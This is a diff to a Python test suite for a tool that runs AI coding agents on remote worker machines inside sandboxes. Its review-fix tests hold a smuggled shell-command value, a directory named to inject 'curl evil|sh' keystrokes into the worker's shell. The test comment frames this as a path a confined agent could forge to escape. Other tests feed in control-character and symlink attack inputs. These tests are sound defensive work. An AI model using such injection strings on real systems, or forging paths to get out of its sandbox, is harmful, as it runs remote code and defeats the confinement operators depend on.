@@ -87,6 +87,7 @@ def checkout(home, clone, branch="nightly", base="main", **changes):
         "agent": "claude",
         "account": None,
         "babysit_root": str(home / "src" / "babysit-pr"),
+        "sandbox": "safehouse",
         **changes,
     }
     return remote_probe.validate_cron_checkout(remote_probe._host_cron_checkout(**args))
@@ -281,7 +282,7 @@ def test_a_job_on_a_worker_starts_its_agent_there(remote):
     assert opened[opened.index("--path") + 1] == str(path)
     [typed] = worker["runs"]
     assert typed[0] == launched["pane"] and typed[1].startswith("codex ")
-    [staged] = (host / ".cache/babysit/cron-prompts").iterdir()
+    [staged] = (host / ".local/state/babysit-pr/cron-prompts").iterdir()
     assert f'"$(cat {staged})"' in typed[1]
     assert staged.read_text() == "Triage new issues\n" + workspace_exit.brief(
         launched["exit_marker"]
@@ -292,6 +293,18 @@ def test_a_job_on_a_worker_starts_its_agent_there(remote):
     jobs.tick()
     with pytest.raises(ValueError, match="already running"):
         jobs.run_now(saved["id"])
+
+
+def watched(jobs):
+    """One watch pass, waiting for its looks at worker runs, which run in the background."""
+    jobs.watch()
+    deadline = time.monotonic() + 30
+    while time.monotonic() < deadline:
+        with jobs.lock:
+            if not jobs.remote_looks:
+                return
+        time.sleep(0.02)
+    raise AssertionError("The look at the worker's run did not finish")
 
 
 def rollout(host, cwd, sid, *events):
@@ -315,7 +328,7 @@ def test_a_workers_run_keeps_the_agents_answer_once_it_confirms(remote):
         {"type": "event_msg", "payload": {"type": "task_started", "turn_id": "t1"}},
     ]
     path = rollout(host, launched["path"], sid, *started)
-    jobs.watch()
+    watched(jobs)
     run = jobs.snapshot()["jobs"][0]["runs"][0]
     assert run["status"] == "running" and "Mac mini" in run["message"]
     done = {
@@ -328,7 +341,7 @@ def test_a_workers_run_keeps_the_agents_answer_once_it_confirms(remote):
     }
     with path.open("a") as stream:
         stream.write(json.dumps(done) + "\n")
-    jobs.watch()
+    watched(jobs)
     run = jobs.snapshot()["jobs"][0]["runs"][0]
     assert run["status"] == "attention", run["message"]
     assert run["message"].startswith("Finished on Mac mini") and "still open" in run["message"]
@@ -344,7 +357,7 @@ def test_a_workers_agent_that_leaves_without_confirming_needs_attention(remote):
     data = store(state)
     data["machines"]["Mac mini"]["agents"] = []
     Path(state).write_text(json.dumps(data))
-    jobs.watch()
+    watched(jobs)
     run = jobs.snapshot()["jobs"][0]["runs"][0]
     assert run["status"] == "attention" and "left its pane on Mac mini" in run["message"]
 
@@ -393,6 +406,7 @@ def test_a_linux_workers_launch_line_runs_its_babysit_bwrap():
         "home": "/home/b",
         "clone": "/home/b/src/repo",
         "claude_home": "/home/b/.claude/accounts/work",
+        "claude_env": "/home/b/.claude/accounts/work",
         "codex_home": "/home/b/.codex",
         "launcher": "/home/b/b/scripts/babysit-bwrap",
     }
@@ -448,3 +462,208 @@ def test_without_a_registry_a_job_runs_here_as_before(local, short_tmp):  # noqa
         assert not any(call[0].startswith("--machine") for call in data["calls"])
     finally:
         jobs.close()
+
+
+# Review fixes -------------------------------------------------------------------------
+
+
+def test_a_checkout_naming_another_common_dir_is_refused(host):
+    home, clone, _ = host
+    path = Path(checkout(home, clone)["path"])
+    # The agent's checkout names a repository it made inside itself, its name full of
+    # keystrokes a typed --add-dirs would carry to the worker's shell.
+    forged = path / "\x15curl evil|sh;#" / ".git"
+    admin = forged / "worktrees" / "x"
+    admin.mkdir(parents=True)
+    (forged / "objects").mkdir()
+    (admin / "gitdir").write_text(f"{path / '.git'}\n")
+    (admin / "commondir").write_text("../..\n")
+    (admin / "HEAD").write_text("ref: refs/heads/nightly\n")
+    (path / ".git").write_text(f"gitdir: {admin}\n")
+    with pytest.raises(ValueError, match="not a worktree of"):
+        checkout(home, clone)
+
+
+def test_a_checkout_inside_the_common_dir_is_refused(host):
+    home, clone, _ = host
+    with pytest.raises(ValueError):
+        checkout(home, clone, directory=str(clone / ".git" / "worktrees-checkout"))
+
+
+def test_a_clone_of_another_repository_is_refused(host):
+    home, clone, _ = host
+    git("remote", "set-url", "origin", "https://github.com/bob/repo.git", cwd=clone)
+    with pytest.raises(ValueError, match="is not a clone of base/repo"):
+        checkout(home, clone)
+
+
+def test_the_base_is_the_remote_tracking_ref_whatever_local_refs_are_named(host):
+    home, clone, upstream = host
+    # A local branch and a tag named like the remote-tracking ref would win by DWIM.
+    git("branch", "origin/main", "HEAD", cwd=clone)
+    git("tag", "origin/main", "HEAD", cwd=clone)
+    found = checkout(home, clone)
+    assert git("rev-parse", "HEAD", cwd=Path(found["path"])) == upstream
+
+
+@pytest.mark.parametrize("bad", ["\x15", "\x1b[201~", "\t", "\x9b", "\x7f"])
+def test_worker_paths_with_control_characters_are_refused(bad):
+    found = {
+        "path": "/home/u/src/worktrees/r/b",
+        "clone": "/home/u/src/r",
+        "common": "/home/u/src/r/.git",
+        "home": "/home/u",
+        "claude_home": None,
+        "claude_env": None,
+        "codex_home": "/home/u/.codex",
+        "launcher": None,
+    }
+    remote_probe.validate_cron_checkout(found)
+    for key in found:
+        with pytest.raises(ValueError, match="Malformed probe answer"):
+            remote_probe.validate_cron_checkout({**found, key: f"/home/u/{bad}x"})
+
+
+@pytest.mark.parametrize("bad", ["\x15", "\x1b[201~", "\n", "\x9b"])
+def test_typed_lines_never_carry_control_characters(bad):
+    import sandbox
+    import wt
+
+    grants = sandbox.Grants()
+    with pytest.raises(ValueError, match="control character"):
+        sandbox.typed_line(["claude", f"a{bad}"], grants, str, "--x", "safehouse")
+    with pytest.raises(ValueError, match="control character"):
+        sandbox.typed_line(
+            ["claude"], grants, str, "--x", "bwrap", launcher="/b", confined=[f"--a={bad}"]
+        )
+    with pytest.raises(ValueError, match="control character"):
+        wt.agent_command("claude", "Go", stage=lambda _: f"/p{bad}")
+    # Ordinary input is typed exactly as before.
+    assert wt.agent_command("codex", "Go", stage=lambda _: "/p") == (
+        'codex -c check_for_update_on_startup=false "$(cat /p)"'
+    )
+
+
+def test_bwrap_trusts_the_config_its_sandboxed_claude_reads(host):
+    home, clone, _ = host
+    (home / ".claude" / ".claude.json").write_text(json.dumps({"projects": {}}))
+    found = checkout(home, clone, sandbox="bwrap")
+    # babysit-bwrap sets CLAUDE_CONFIG_DIR, so even the default login reads its own copy.
+    inner = json.loads((home / ".claude" / ".claude.json").read_text())["projects"]
+    assert inner[found["path"]] == {"hasTrustDialogAccepted": True}
+    assert found["claude_env"] == str(home / ".claude")
+    # On a Mac worker the default login keeps ~/.claude.json and no CLAUDE_CONFIG_DIR.
+    found = checkout(home, clone, branch="other")
+    assert found["claude_env"] is None
+    outer = json.loads((home / ".claude.json").read_text())["projects"]
+    assert outer[found["path"]] == {"hasTrustDialogAccepted": True}
+
+
+def test_a_named_account_keeps_its_literal_path_for_claude(host, tmp_path):
+    home, clone, _ = host
+    elsewhere = tmp_path / "work-login"
+    elsewhere.mkdir()
+    (elsewhere / ".claude.json").write_text("{}")
+    (home / ".claude" / "accounts").mkdir()
+    (home / ".claude" / "accounts" / "work").symlink_to(elsewhere)
+    found = checkout(home, clone, account="work")
+    # Claude names its Keychain item after the path it is given, not where it leads.
+    assert found["claude_env"] == str(home / ".claude" / "accounts" / "work")
+    assert found["claude_home"] == str(elsewhere.resolve())
+
+
+def test_the_latest_turn_is_read_from_a_transcripts_end(host, monkeypatch):
+    home, clone, _ = host
+    monkeypatch.setattr(remote_probe, "MAX_SCAN", 4096)
+    sid = str(uuid.uuid4())
+    day = home / ".codex" / "sessions" / "2026" / "10" / "25"
+    day.mkdir(parents=True)
+    path = day / f"rollout-2026-10-25T10-00-00-{sid}.jsonl"
+    filler = {"type": "event_msg", "payload": {"type": "token_count", "pad": "x" * 200}}
+    records = [
+        {"type": "session_meta", "payload": {"id": sid, "cwd": str(clone)}},
+        *[filler] * 100,
+        {"type": "event_msg", "payload": {"type": "task_started", "turn_id": "t9"}},
+        {
+            "type": "event_msg",
+            "payload": {"type": "task_complete", "turn_id": "t9", "last_agent_message": "Done"},
+        },
+    ]
+    path.write_text("".join(json.dumps(record) + "\n" for record in records))
+    assert path.stat().st_size > 4 * 4096
+    found = remote_probe.validate_turn(remote_probe._host_turn(str(path), sid, "codex"))
+    assert found == {"turn": "t9", "complete": "Done"}
+
+
+def test_prompts_are_staged_only_in_a_private_folder(tmp_path, fake_tools, short_tmp):
+    (short_tmp / "home").mkdir()
+    (short_tmp / "home" / "machines.json").write_text(
+        json.dumps({"version": 1, "machines": [WORKER]})
+    )
+    worker = machines.resolve(short_tmp / "home", "mini")
+    host = tmp_path / "hosts" / "mini.test"
+    folder = host / ".local" / "state" / "babysit-pr"
+    folder.mkdir(parents=True)
+    elsewhere = tmp_path / "elsewhere"
+    elsewhere.mkdir()
+    (folder / "cron-prompts").symlink_to(elsewhere)
+    target = machines.remote_path(cron_agents.REMOTE_PROMPTS)
+    assert cron_agents.REMOTE_PROMPTS == "~/.local/state/babysit-pr/cron-prompts"
+    with pytest.raises(ValueError, match="Could not stage"):
+        machines.put_file(short_tmp / "home", worker, target, "a", b"x", keep=60)
+    assert not list(elsewhere.iterdir())
+    (folder / "cron-prompts").unlink()
+    (folder / "cron-prompts").mkdir()
+    (folder / "cron-prompts").chmod(0o777)
+    with pytest.raises(ValueError, match="Could not stage"):
+        machines.put_file(short_tmp / "home", worker, target, "a", b"x", keep=60)
+    (folder / "cron-prompts").chmod(0o700)
+    assert machines.put_file(short_tmp / "home", worker, target, "a", b"x").endswith("/a")
+
+
+def test_a_staged_path_with_control_characters_is_refused(monkeypatch, short_tmp):
+    worker = machines.Machine(
+        "mini", "Mac mini", "mini", "darwin", "~/src", "~/b", "python3", 4, (), None, True
+    )
+
+    def answer(home, m, argv, **kwargs):
+        return subprocess.CompletedProcess(argv, 0, b"/home/u/\x15x/a", b"")
+
+    monkeypatch.setattr(machines, "run", answer)
+    with pytest.raises(ValueError, match="Could not stage"):
+        machines.put_file(short_tmp, worker, machines.remote_path("~/p"), "a", b"x")
+
+
+def test_a_hung_worker_never_holds_up_the_scheduler(remote, monkeypatch):
+    import threading
+
+    jobs, manager, _, _, _ = remote
+    saved = jobs.save(job_request(manager))
+    jobs.run_now(saved["id"])
+    settled(jobs)
+    release = threading.Event()
+    calls = []
+
+    def hung(home, run, launched):
+        calls.append(run["id"])
+        release.wait(20)
+        return {"state": "watching", "message": "Still"}
+
+    monkeypatch.setattr(cron_agents, "remote_progress", hung)
+    try:
+        started = time.monotonic()
+        jobs.watch()
+        jobs.watch()  # A second pass never stacks another look at the same run.
+        assert time.monotonic() - started < 2
+        deadline = time.monotonic() + 5
+        while not calls and time.monotonic() < deadline:
+            time.sleep(0.02)
+        assert len(calls) == 1
+    finally:
+        release.set()
+
+
+def test_a_codex_job_on_a_worker_names_no_claude_account(remote):
+    jobs, manager, *_ = remote
+    with pytest.raises(ValueError, match="only be selected for Claude"):
+        jobs.save(job_request(manager, claude_account="work"))
